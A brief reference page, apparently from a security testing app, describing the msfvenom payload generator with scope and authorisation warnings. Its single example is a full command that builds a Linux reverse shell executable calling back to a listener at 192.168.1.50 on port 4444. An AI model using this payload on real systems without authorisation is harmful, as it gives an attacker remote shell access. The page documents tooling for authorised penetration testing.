# msfvenom

`msfvenom` &middot; _exploitation-tools_

Generates payloads and shellcode in many formats.

**High impact.** This tool can disrupt a target or a network. Confirm scope first.

## What this tool needs

- Metasploit installed on demand.
- A legitimate reason: payload generation is only for authorised testing.

## How to use it

Builds a payload file (e.g. a reverse shell) for a lab. This is included for completeness; the app never auto-delivers or executes payloads.

## Examples

```console
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf -o shell.elf
```
